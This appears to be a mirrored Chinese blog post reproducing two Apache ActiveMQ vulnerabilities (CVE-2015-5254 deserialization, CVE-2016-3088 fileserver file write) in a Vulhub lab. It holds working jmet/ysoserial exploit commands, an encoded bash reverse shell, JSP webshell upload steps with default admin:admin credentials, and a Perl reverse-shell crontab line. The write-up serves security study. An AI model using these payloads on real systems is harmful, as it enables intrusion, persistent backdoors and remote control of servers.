# ActiveMQ反序列化(CVE-2015-5254) && ActiveMQ任意文件写入 (CVE-2016-3088) - 淚笑 - 博客园

> 原文：[https://www.cnblogs.com/leixiao-/p/10218359.html](https://www.cnblogs.com/leixiao-/p/10218359.html)

# ActiveMQ 反序列化漏洞(CVE-2015-5254)

## 漏洞详情

ActiveMQ启动后，将监听61616和8161两个端口，其中消息在61616这个端口进行传递，使用ActiveMQ这个中间件的程序也通过这个端口工作，8161是Web服务的端口，通过Web页面可管理ActiveMQ
ActiveMQ反序列化漏洞存在于ActiveMQ5.13.0之前5.x版本中，该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的Java Message Service(JMS)ObjectMessage对象利用该漏洞执行任意代码。

## 复现

### 工具

需要使用[jmet](https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar)工具，首先下载jmet的jar文件，并手动在同目录下创建一个external文件夹(否则可能会爆文件夹不存在的错误)

### 漏洞利用

1.  构造可执行命令的java序列化对象
    ysoserial集合了各种java反序列化payload，而jmet集成了[ysoserial](https://github.com/frohoff/ysoserial)
2.  把序列化对象作为一个消息，发送给目标的工作端口
3.  访问Web管理页面，读取消息，触发漏洞
    ActiveMQ Web管理页面默认账号密码是admin:admin

执行
`java -jar jmet-0.1.0-all.jar -Q l3yx -I ActiveMQ -Y "touch /success" -Yp ROME 192.168.122.1 61616`
![](../Images/7f06f60d4267bead849e0f6e31d567ee.png)

 `usage: jmet [host] [port]
-Q,--Queue <name>queue name
-I,--impl <arg>ActiveMQ| Artemis| WebSphereMQ| Qpid10|
Qpid09| HornetQ| SwiftMQ| RabbitMQ|
OpenMQ
-Y,--ysoserial <cmd>Deser exploitation mode
-Yp,--payload <payloadname>Optional: Ysoserial Payload to use
BeanShell1| CommonsBeanutils1|
CommonsCollections1|
CommonsCollections2|
CommonsCollections3|
CommonsCollections4|
CommonsCollections5| Groovy1|
Hibernate1| Hibernate2| Jdk7u21| JSON1|
ROME| Spring1| Spring2</payloadname></cmd></arg></name>

```
 -Q指定队列消息名，-I指定JMS客户端，这里是ActiveMQ，-Y指定具体的命令，-Yp指定payload类型，其后分别是ActiveMQ所在机器的ip及工作端口
所以这条命令是使用ROME payload把 执行 touch /success 命令序列化后作为名为l3yx的消息发送给ActiveMQ 

然后在Web管理页面可查看信息http://your-ip:8161/
![](https://img2018.cnblogs.com/blog/1495876/201901/1495876-20190104133948879-427164103.png)
![](https://img2018.cnblogs.com/blog/1495876/201901/1495876-20190104133956574-657034883.png)

查看消息的详情后就可触发反序列化漏洞，进入docker可以验证命令执行结果
`docker-compose exec activemq bash`
![](https://img2018.cnblogs.com/blog/1495876/201901/1495876-20190104134006607-1084499944.png)

然后使用反弹shell的命令
`java -jar jmet-0.1.0-all.jar -Q l3yx -I ActiveMQ -Y "bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwL3h4Lnh4Lnh4Lnh4LzEzMTQgMD4mMQ==}|{base64,-d}|{bash,-i}" -Yp ROME 192.168.122.1 61616`

Vulhub文档里给的反弹shell的payload就是
`bash -c  {echo,YmFzaCAtaSA+Ji9kZXYvdGNwL3h4Lnh4Lnh4Lnh4LzEzMTQgMD4mMQ==}|{base64,-d}|{bash,-i}`

这条命令可以去看[linux下形如{command,parameter,parameter}执行命令 / bash花括号扩展](https://www.cnblogs.com/leixiao-/p/10216571.html)
![](https://img2018.cnblogs.com/blog/1495876/201901/1495876-20190104134017498-208373815.png)
![](https://img2018.cnblogs.com/blog/1495876/201901/1495876-20190104134023598-1267702351.png)

#ActiveMQ任意文件写入 (CVE-2016-3088)
##漏洞详情
###背景
8161为web控制台端口，本漏洞就出现在web控制台中
ActiveMQ的web控制台分三个应用，admin、api和fileserver，其中admin是管理员页面，api是接口，fileserver是储存文件的接口；admin和api都需要登录后才能使用，fileserver无需登录。
fileserver是一个RESTful API接口，我们可以通过GET、PUT、DELETE等HTTP请求对其中存储的文件进行读写操作，其设计目的是为了弥补消息队列操作不能传输、存储二进制文件的缺陷，但后来发现：其使用率并不高而且文件操作容易出现漏洞
所以，ActiveMQ在5.12.x~5.13.x版本中，已经默认关闭了fileserver这个应用（你可以在conf/jetty.xml中开启之）；在5.14.0版本以后，彻底删除了fileserver应用。
###漏洞利用
本漏洞出现在fileserver应用中，漏洞原理其实非常简单，就是fileserver支持写入文件（但不解析jsp），同时支持移动文件（MOVE请求）。所以，我们只需要写入一个文件，然后使用MOVE请求将其移动到任意位置，造成任意文件写入漏洞。
文件写入有几种利用方法：
1\. 写入webshell
2\. 写入cron或ssh key等文件
3\. 写入jar或jetty.xml等库和配置文件

写入webshell的好处是，门槛低更方便，但前面也说了fileserver不解析jsp，admin和api两个应用都需要登录才能访问，所以有点鸡肋(但默认账号密码都是admin:admin)。写入cron或ssh key，好处是直接反弹拿shell，也比较方便，缺点是需要root权限；写入jar，稍微麻烦点（需要jar的后门），写入xml配置文件，这个方法比较靠谱，但有个鸡肋点是：我们需要知道activemq的绝对路径

##写入webshell
写入webshell，需要写在admin或api应用中才能被解析，而这俩应用都需要登录才能访问，默认账号密码为admin:admin，首先访问http://your-ip:8161/admin/test/systemProperties.jsp，查看ActiveMQ的绝对路径
![](https://img2018.cnblogs.com/blog/1495876/201901/1495876-20190104143225763-341838470.png)

访问http://192.168.122.1:8161/fileserver/并用burp抓包，方便直接修改，改为PUT包，填写文件名，并且内容写入Cknife的jsp马，返回204即为成功
![](https://img2018.cnblogs.com/blog/1495876/201901/1495876-20190104143239325-1376791767.png)
![](https://img2018.cnblogs.com/blog/1495876/201901/1495876-20190104143245014-1183806380.png)

移动到web目录下的api文件夹(/opt/activemq/webapps/api/x.jsp)中(admin目录下jsp也可被解析)
![](https://img2018.cnblogs.com/blog/1495876/201901/1495876-20190104143252059-1611475923.png)

尝试访问无报错则已经成功移动
![](https://img2018.cnblogs.com/blog/1495876/201901/1495876-20190104143301866-480670215.png)

在Cknife添加shell，而且还需要设置一个请求头才能访问，因为访问api是需要通过基础认证的，所以在Cknife的shell右键-设置-请求头-开启，并写入Authorization: Basic YWRtaW46YWRtaW4= (该请求头在通过基础认证之后，访问admin或是api目录再用burp就可抓到)
![](https://img2018.cnblogs.com/blog/1495876/201901/1495876-20190104143310125-1083549546.png)
![](https://img2018.cnblogs.com/blog/1495876/201901/1495876-20190104143316965-893753944.png)
![](https://img2018.cnblogs.com/blog/1495876/201901/1495876-20190104143322288-1722943140.png)

##写入crontab
cron是一个linux下 的定时执行工具，可以在无需人工干预的情况下运行作业，cron读取一个或多个配置文件，这些配置文件中包含了命令行及其调用时间。cron的配置文件称为crontab，是cron table的简写
Vulhub文档里的配置
`*/1 * * * * root /usr/bin/perl -e 'use Socket;$i="10.0.0.1";$p=21;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`

crontab中前5项应填数字，分别代表分钟，小时，天，月，星期，`*`代表任意值；`,`允许一项内填多个值，其间就用逗号分隔；`/`可以理解为整除，`*/1` 和 `*` 没有区别，`*/2` 可以看成是能被2整除的任意值；`*/1 * * * *`就代表每分钟都会执行；`root`代表的是执行的级别为root身份。`/usr/bin/perl -e 'use Socket;$i="10.0.0.1";$p=21;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`是使用perl执行代码，-e后面的代码应该就是perl反弹shell的方法

首先上传cron配置文件(注意，换行一定要\n，不能是\r\n，否则crontab执行会失败)
![](https://img2018.cnblogs.com/blog/1495876/201901/1495876-20190104155751641-1485372109.png)

然后移动到/etc/cron.d/l3yx，/etc/cron.d/目录下的文件都会被作为crontab而被读取执行
![](https://img2018.cnblogs.com/blog/1495876/201901/1495876-20190104155800542-189628033.png)

然而并没有成功，一番调试后，把绝对路径执行perl`/usr/bin/perl -e`改为`perl -e`再次写入/etc/cron.d/l3yx，shell反弹成功
![](https://img2018.cnblogs.com/blog/1495876/201901/1495876-20190104155807913-1209938408.png)

这个方法需要ActiveMQ是root运行，否则也不能写入cron文件

参考：
[https://vulhub.org/#/environments/activemq/CVE-2015-5254/](https://vulhub.org/#/environments/activemq/CVE-2015-5254/)
[https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf)
[https://github.com/vulhub/vulhub/blob/master/activemq/CVE-2016-3088/README.zh-cn.md](https://github.com/vulhub/vulhub/blob/master/activemq/CVE-2016-3088/README.zh-cn.md)
[Linux下的crontab定时执行任务命令详解](https://www.cnblogs.com/longjshz/p/5779215.html)
[Ubuntu下crontab命令的用法](https://www.cnblogs.com/daxian2012/articles/2589894.html)
````